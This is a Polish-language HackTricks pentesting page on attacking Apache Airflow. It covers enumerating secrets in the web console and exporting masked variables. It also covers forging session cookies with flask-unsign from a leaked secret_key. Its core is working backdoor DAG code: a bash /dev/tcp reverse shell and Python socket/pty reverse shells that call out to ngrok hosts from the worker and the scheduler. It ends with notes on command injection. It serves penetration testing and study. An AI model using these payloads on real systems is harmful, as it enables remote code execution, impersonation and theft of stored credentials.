# Bezpieczeństwo Apache Airflow

<details>

<summary><strong>Dowiedz się, jak hakować AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeśli chcesz zobaczyć swoją **firmę reklamowaną w HackTricks** lub **pobrać HackTricks w formacie PDF**, sprawdź [**PLAN SUBSKRYPCJI**](https://github.com/sponsors/carlospolop)!
* Zdobądź [**oficjalne gadżety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzinę PEASS**](https://opensea.io/collection/the-peass-family), naszą kolekcję ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** mnie na **Twitterze** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Podziel się swoimi sztuczkami hakerskimi, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

## Podstawowe informacje

[**Apache Airflow**](https://airflow.apache.org) służy jako platforma do **orkiestracji i harmonogramowania potoków danych lub prac**. Termin "orkiestracja" w kontekście potoków danych oznacza proces organizowania, koordynowania i zarządzania złożonymi przepływami danych pochodzącymi z różnych źródeł. Głównym celem tych zorganizowanych potoków danych jest dostarczanie przetworzonych i użytecznych zestawów danych. Zestawy danych te są szeroko wykorzystywane przez wiele aplikacji, w tym narzędzia do inteligencji biznesowej, modele nauki danych i uczenia maszynowego, które są podstawą działania aplikacji big data.

W zasadzie, Apache Airflow pozwoli Ci **harmonogramować wykonanie kodu, gdy coś się** (zdarzenie, cron) **wydarzy**.

## Lokalne laboratorium

### Docker-Compose

Możesz użyć **pliku konfiguracyjnego docker-compose** z [**https://raw.githubusercontent.com/apache/airflow/main/docs/apache-airflow/start/docker-compose.yaml**](https://raw.githubusercontent.com/apache/airflow/main/docs/apache-airflow/start/docker-compose.yaml), aby uruchomić kompletną środowisko Apache Airflow w kontenerze Docker. (Jeśli korzystasz z systemu MacOS, upewnij się, że przypisujesz co najmniej 6 GB pamięci RAM dla maszyny wirtualnej Docker).

### Minikube

Jednym prostym sposobem **uruchomienia Apache Airflow** jest uruchomienie go **z minikube**:
```bash
helm repo add airflow-stable https://airflow-helm.github.io/charts
helm repo update
helm install airflow-release airflow-stable/airflow
# Some information about how to aceess the web console will appear after this command

# Use this command to delete it
helm delete airflow-release
```
## Konfiguracja Airflow

Airflow może przechowywać **wrażliwe informacje** w swojej konfiguracji lub można znaleźć słabe konfiguracje:

{% content-ref url="airflow-configuration.md" %}
[airflow-configuration.md](airflow-configuration.md)
{% endcontent-ref %}

## RBAC w Airflow

Przed rozpoczęciem ataku na Airflow, powinieneś zrozumieć, **jak działają uprawnienia**:

{% content-ref url="airflow-rbac.md" %}
[airflow-rbac.md](airflow-rbac.md)
{% endcontent-ref %}

## Ataki

### Wyliczanie konsoli internetowej

Jeśli masz **dostęp do konsoli internetowej**, możesz mieć możliwość uzyskania dostępu do niektórych lub wszystkich następujących informacji:

* **Zmienne** (Niestandardowe wrażliwe informacje mogą być przechowywane tutaj)
* **Połączenia** (Niestandardowe wrażliwe informacje mogą być przechowywane tutaj)
* Uzyskaj do nich dostęp pod adresem `http://<airflow>/connection/list/`
* [**Konfiguracja**](./#airflow-configuration) (Wrażliwe informacje, takie jak **`secret_key`** i hasła, mogą być przechowywane tutaj)
* Wyświetl listę **użytkowników i ról**
* **Kod każdego DAG** (który może zawierać interesujące informacje)

### Pobieranie wartości zmiennych

Zmienne mogą być przechowywane w Airflow, dzięki czemu **DAGi** mogą **uzyskać dostęp** do ich wartości. Jest to podobne do sekretów innych platform. Jeśli masz **wystarczające uprawnienia**, możesz uzyskać do nich dostęp w interfejsie graficznym pod adresem `http://<airflow>/variable/list/`.\
Domyślnie Airflow wyświetli wartość zmiennej w interfejsie graficznym, jednak zgodnie z [**tym**](https://marclamberti.com/blog/variables-with-apache-airflow/) istnieje możliwość ustawienia **listy zmiennych**, których **wartość** będzie wyświetlana jako **gwiazdki** w **interfejsie graficznym**.

![](<../../.gitbook/assets/image (79).png>)

Jednak te **wartości** nadal można **odzyskać** za pomocą **CLI** (musisz mieć dostęp do bazy danych), **arbitrary DAG** execution, **API** uzyskując dostęp do punktu końcowego zmiennych (API musi być aktywowane), a nawet **sam interfejs graficzny!**\
Aby uzyskać dostęp do tych wartości z interfejsu graficznego, po prostu **wybierz zmienne**, do których chcesz uzyskać dostęp, a następnie **kliknij Akcje -> Eksportuj**.\
Innym sposobem jest wykonanie **brute force** na **ukrytej wartości**, używając **filtru wyszukiwania**, aż ją odnajdziesz:

![](<../../.gitbook/assets/image (30).png>)

### Eskalacja uprawnień

Jeśli konfiguracja **`expose_config`** jest ustawiona na **True**, od roli **Użytkownik** i wyżej można **odczytać** konfigurację w sieci. W tej konfiguracji pojawia się **`secret_key`**, co oznacza, że ​​każdy użytkownik z tą ważną wartością może **utworzyć własne podpisane ciasteczko, aby podszywać się pod dowolne inne konto użytkownika**.
```bash
flask-unsign --sign --secret '<secret_key>' --cookie "{'_fresh': True, '_id': '12345581593cf26619776d0a1e430c412171f4d12a58d30bef3b2dd379fc8b3715f2bd526eb00497fcad5e270370d269289b65720f5b30a39e5598dad6412345', '_permanent': True, 'csrf_token': '09dd9e7212e6874b104aad957bbf8072616b8fbc', 'dag_status_filter': 'all', 'locale': 'en', 'user_id': '1'}"
```
### Tylnie drzwi DAG (RCE w Airflow worker)

Jeśli masz **uprawnienia do zapisu** w miejscu, gdzie **zapisywane są DAGi**, możesz po prostu **utworzyć jeden**, który wyśle ci **odwróconą powłokę**.\
Należy zauważyć, że ta odwrócona powłoka zostanie wykonana wewnątrz **kontenera pracownika Airflow**:
```python
import pendulum
from airflow import DAG
from airflow.operators.bash import BashOperator

with DAG(
dag_id='rev_shell_bash',
schedule_interval='0 0 * * *',
start_date=pendulum.datetime(2021, 1, 1, tz="UTC"),
) as dag:
run = BashOperator(
task_id='run',
bash_command='bash -i >& /dev/tcp/8.tcp.ngrok.io/11433  0>&1',
)
```

```python
import pendulum, socket, os, pty
from airflow import DAG
from airflow.operators.python import PythonOperator

def rs(rhost, port):
s = socket.socket()
s.connect((rhost, port))
[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
pty.spawn("/bin/sh")

with DAG(
dag_id='rev_shell_python',
schedule_interval='0 0 * * *',
start_date=pendulum.datetime(2021, 1, 1, tz="UTC"),
) as dag:
run = PythonOperator(
task_id='rs_python',
python_callable=rs,
op_kwargs={"rhost":"8.tcp.ngrok.io", "port": 11433}
)
```
### Tylna furtka DAG (RCE w harmonogramie Airflow)

Jeśli ustawisz coś do **wykonania w głównym kodzie**, w chwili pisania tego, zostanie **wykonane przez harmonogram** po kilku sekundach od umieszczenia go w folderze DAG.
```python
import pendulum, socket, os, pty
from airflow import DAG
from airflow.operators.python import PythonOperator

def rs(rhost, port):
s = socket.socket()
s.connect((rhost, port))
[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
pty.spawn("/bin/sh")

rs("2.tcp.ngrok.io", 14403)

with DAG(
dag_id='rev_shell_python2',
schedule_interval='0 0 * * *',
start_date=pendulum.datetime(2021, 1, 1, tz="UTC"),
) as dag:
run = PythonOperator(
task_id='rs_python2',
python_callable=rs,
op_kwargs={"rhost":"2.tcp.ngrok.io", "port": 144}
```
### Tworzenie DAG

Jeśli uda ci się **skompromitować maszynę w klastrze DAG**, możesz tworzyć nowe **skrypty DAG** w folderze `dags/`, a zostaną one **skopiowane na pozostałe maszyny** w klastrze DAG.

### Wstrzykiwanie kodu DAG

Podczas wykonywania DAG z interfejsu graficznego możesz **przekazywać argumenty** do niego.\
Dlatego, jeśli DAG nie jest odpowiednio zakodowany, może być **podatny na wstrzykiwanie poleceń**.\
Tak właśnie stało się w przypadku tej podatności: [https://www.exploit-db.com/exploits/49927](https://www.exploit-db.com/exploits/49927)

Wszystko, co musisz wiedzieć, aby **rozpocząć poszukiwanie wstrzykiwania poleceń w DAG**, to to, że **parametry** są **odczytywane** za pomocą kodu **`dag_run.conf.get("param_name")`**.

Ponadto, ta sama podatność może wystąpić również w przypadku **zmiennych** (zauważ, że przy odpowiednich uprawnieniach możesz **kontrolować wartość zmiennych** w interfejsie graficznym). Zmienne są **odczytywane za pomocą**:
```python
from airflow.models import Variable
[...]
foo = Variable.get("foo")
```
Jeśli są używane na przykład wewnątrz polecenia bash, można przeprowadzić wstrzyknięcie poleceń.

<details>

<summary><strong>Naucz się hakować AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeśli chcesz zobaczyć swoją **firmę reklamowaną w HackTricks** lub **pobrać HackTricks w formacie PDF**, sprawdź [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Zdobądź [**oficjalne gadżety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzinę PEASS**](https://opensea.io/collection/the-peass-family), naszą kolekcję ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** mnie na **Twitterze** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Podziel się swoimi sztuczkami hakerskimi, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repozytoriów github.

</details>
